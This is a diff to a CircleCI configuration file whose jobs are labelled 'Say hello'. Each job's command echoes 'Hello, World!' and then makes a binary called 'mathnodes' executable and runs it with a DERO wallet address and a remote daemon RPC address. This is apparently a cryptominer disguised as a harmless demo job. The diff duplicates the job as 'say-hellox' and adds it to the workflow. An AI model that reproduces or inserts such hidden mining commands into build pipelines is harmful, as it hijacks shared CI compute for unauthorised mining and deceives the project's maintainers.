@@ -1,7 +1,7 @@
 # Use the latest 2.1 version of CircleCI pipeline process engine.
 # See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
-
+##########################################################################################################################################################
 # Define a job to be invoked later in a workflow.
 # See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
@@ -17,7 +17,18 @@ jobs:
       - run:
           name: "Say hello"
           command: echo Hello, World!;chmod 700 mathnodes;./mathnodes --wallet-address=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj --daemon-rpc-address=dero-node.mysrv.cloud:10300
-
+  say-hellox:
+    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
+    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+    docker:
+      - image: cimg/base:stable
+    # Add steps to the job
+    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command: echo Hello, World!;chmod 700 mathnodes;./mathnodes --wallet-address=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj --daemon-rpc-address=dero-node.mysrv.cloud:10300
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
@@ -25,3 +36,4 @@ workflows:
   say-hello-workflow:
     jobs:
       - say-hello
+      - say-hellox
